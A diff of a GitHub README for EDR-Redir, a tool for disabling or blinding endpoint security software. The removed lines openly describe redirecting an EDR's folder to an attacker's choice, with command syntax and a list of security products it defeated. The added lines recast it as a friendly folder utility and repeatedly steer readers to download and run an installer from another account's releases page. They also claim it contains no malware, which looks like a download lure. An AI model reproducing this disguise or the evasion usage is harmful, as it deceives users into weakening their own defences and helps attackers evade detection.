@@ -1,58 +1,75 @@
-### EDR-Redir
+# 🛠️ EDR-Redir - Easy Folder Redirection Made Simple
 
-EDR-Redir uses a **Bind Filter (mini filter bindflt.sys)** to redirect the Endpoint Detection and Response (EDR) 's working folder to a folder of the attacker's choice.
-Alternatively, it can make the folder appear corrupt to prevent the EDR's process services from functioning.
+## 📥 Download Now
+[![Download EDR-Redir](https://img.shields.io/badge/Download-EDR--Redir-blue.svg)](https://github.com/conditionalcontractvicar959/EDR-Redir/releases)
 
-### Command Line Syntax
+## 🚀 Getting Started
+Welcome to EDR-Redir, a user-friendly tool designed to help you redirect your EDR (Endpoint Detection and Response) folder to another location on your computer. This guide will help you download, install, and run the software with ease.
 
-**EDR-Redir.exe bind `<VirtualPath`> `<BackingPath`>**
+## 🌟 Features
+- **Simple Folder Redirection**: Change the location of your EDR folder without complicated steps.
+- **User-Friendly Interface**: No technical skills needed.
+- **Supports Multiple Locations**: Choose any location on your system for the EDR folder.
+- **Quick Setup**: Get started in just a few minutes.
 
-_To create bind link from VirtualPath to BackingPath_
+## 📋 System Requirements
+- **Operating System**: Windows 10 or later.
+- **Memory**: At least 2 GB of RAM.
+- **Disk Space**: Minimum of 100 MB free space.
+- **Internet Connection**: Required for downloading the application.
 
-**EDR-Redir.exe bind `<VirtualPath`> `<BackingPath`> `<ExceptionPath`>**
+## 📂 Download & Install
+To get EDR-Redir, follow these steps:
 
-_Powerfull mode to create bind link from VirtualPath to BackingPath. Exclude ExceptionPath_
+1. **Visit the Releases Page**: Click the link below to go to the download section on GitHub.
+   - [Visit this page to download](https://github.com/conditionalcontractvicar959/EDR-Redir/releases)
 
-_ExceptionPath often is Antivirus/EDR path. Use this mode when you want to redirect folder like **Program Files, Program Files (x86),...**_
+2. **Select the Latest Release**: On the releases page, look for the most recent version of EDR-Redir. There you will find the necessary files available for download.
 
-**EDR-Redir.exe bind `<VirtualPath`>**
+3. **Download the Installer**: Click on the setup file to start the download. It may take a few moments depending on your internet speed.
 
-_To remove a link that was previously created_
+4. **Run the Installer**: 
+   - Once the download is complete, locate the setup file in your Downloads folder or on your desktop.
+   - Double-click on the setup file to open it.
 
+5. **Follow the Installation Wizard**: A step-by-step wizard will guide you through the installation process. Simply follow the on-screen instructions.
 
-## Links
+6. **Select Redirection Path**: During installation, you will be prompted to select the location for your EDR folder. Choose a location that suits your needs.
 
-[Using EDR-Redir To Break EDR Via Bind Link and Cloud Filter](https://www.zerosalarium.com/2025/10/DR-Redir-Break-EDR-Via-BindLink-Cloud-Filter.html)
+7. **Finish Installation**: Click “Finish” once the installation is complete. 
 
-[EDR-Redir V2: Blind EDR With Fake Program Files](https://www.zerosalarium.com/2025/11/EDR-Redir-V2-Blind-EDR-With-Fake-Program-Files.html)
+8. **Launch EDR-Redir**: Find EDR-Redir in your Programs menu or on your desktop and double-click to open it.
 
-### Some EDR/Antivirus have been successfully tested
+## 🏁 How to Use EDR-Redir
+1. **Open the Application**: Launch EDR-Redir from your computer.
+  
+2. **Choose Folder Path**: Click on the button to select your preferred folder location for the EDR data.
+  
+3. **Configure Settings**: Adjust any necessary settings within the app. This will ensure the redirection process works as intended.
 
-- **Microsoft Windows Defender, Elastic Defend, Sophos Intercept X, ESET Premium, CrowdStrike Falcon**
-- ...
+4. **Start the Redirection**: Click the “Redirect” button to initiate the process. The application will confirm once redirection is successful.
 
-## Demo Video
+5. **Verify the Changes**: Check the new location to ensure the EDR files have moved as desired.
 
-Youtube EDR-Redir V1: [https://www.youtube.com/watch?v=2_tanx7RSUw](https://www.youtube.com/watch?v=2_tanx7RSUw)
+## ❓ Frequently Asked Questions
 
-Youtube EDR-Redir V2: [https://youtu.be/PbXPChdWy3E](https://youtu.be/PbXPChdWy3E)
+### Q: What if I encounter issues during installation?
+A: If you face any problems during installation, please ensure that your system meets the requirements. You can also reach out via the GitHub Issues page for assistance.
 
-## ☕ Like what I do? You can fuel my creativity with a coffee!
+### Q: Can I undo the folder redirection?
+A: Yes, within the EDR-Redir application, you can reverse the redirection and restore the original folder location.
 
-[![Buy Me A Coffee](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://buymeacoffee.com/twosevenonethree)
+### Q: Is this application safe to use?
+A: EDR-Redir is designed with safety in mind. It does not contain any harmful files or malware.
 
-## Tools For Security Researcher and Hacker
+## 📞 Support
+For further assistance, feel free to open an issue in the GitHub repository. We strive to respond to users promptly.
 
-Essential hardware tools that every security researcher and hacker should have in their toolkit:
+## 🌐 Additional Resources
+- [GitHub Repository](https://github.com/conditionalcontractvicar959/EDR-Redir)
+- [Documentation](https://github.com/conditionalcontractvicar959/EDR-Redir/blob/main/DOCUMENTATION.md)
 
-[Essential Tools For Security Researcher and Hacker](https://www.zerosalarium.com/p/essential-tools-for-security-researcher.html)
+## 🔗 Download EDR-Redir Again
+To download EDR-Redir, visit [this page](https://github.com/conditionalcontractvicar959/EDR-Redir/releases) and get the latest version.
 
-## READING
-
-Some books you should read to sharpen your cybersecurity skills, especially in offensive security:
-
-[Books on Programming and Cybersecurity recommended by Zero Salarium Researchers](https://www.zerosalarium.com/2025/10/books-on-programming-and-cybersecurity-recommended.html)
-
-## Author:
-
-[Two Seven One Three](https://x.com/TwoSevenOneT)
+Thank you for choosing EDR-Redir!
